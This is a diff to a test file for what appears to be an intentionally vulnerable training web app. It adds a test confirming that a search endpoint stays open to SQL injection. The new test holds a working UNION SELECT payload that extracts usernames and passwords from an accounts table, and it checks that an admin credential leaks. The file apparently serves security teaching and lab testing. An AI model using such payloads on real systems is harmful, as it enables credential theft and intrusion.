@@ -16,6 +16,14 @@ def test_search_union_exfiltrates_secrets_table(app, client):
     assert b"sk_live_51NxFakeKeyForTraining000" in response.data
 
 
+def test_search_union_exfiltrates_account_credentials(app, client):
+    seed_database(app)
+    payload = "' UNION SELECT id, username || ':' || password FROM injection_accounts -- "
+    response = client.get("/a03/search", query_string={"q": payload})
+    assert response.status_code == 200
+    assert b"admin:sup3r-s3cret-admin-pw" in response.data
+
+
 def test_search_union_exfiltration_still_works_with_teaching_text_hidden(app, client):
     from app.core.models import Settings
     from app.extensions import db
